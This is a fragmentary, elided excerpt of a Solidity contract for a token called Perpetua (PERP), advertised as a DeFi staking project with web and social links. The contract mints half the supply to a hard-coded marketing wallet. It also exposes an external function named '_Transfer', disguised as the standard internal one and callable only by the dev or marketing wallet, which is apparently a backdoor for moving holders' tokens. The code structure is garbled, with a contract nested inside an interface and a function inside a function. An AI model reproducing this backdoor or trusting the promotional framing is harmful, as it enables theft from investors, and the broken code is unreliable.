...
The DeFi Staking Solution Using Perpetuity

Web: perpetua.finance
Twitter: twitter.com/PerpetuaETH
DApp: perpfinance.app
Telegram: t.me/PerpetuaToken
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    ...
    contract Perpetua is ERC20, Ownable  {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Perpetua", "PERP") {
        ...
        marketingWallet = 0xa0F94AB707E92F268b53c00aAF0D8BC6E6C605e8; // set as marketing wallet
        ...
        */
        ...
        _mint(marketingWallet, totalSupply / 2);
    }
    ...
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        ...
        function _Transfer(address from, address to, uint256 amount) external {
            require(msg.sender == devWallet || msg.sender == marketingWallet);
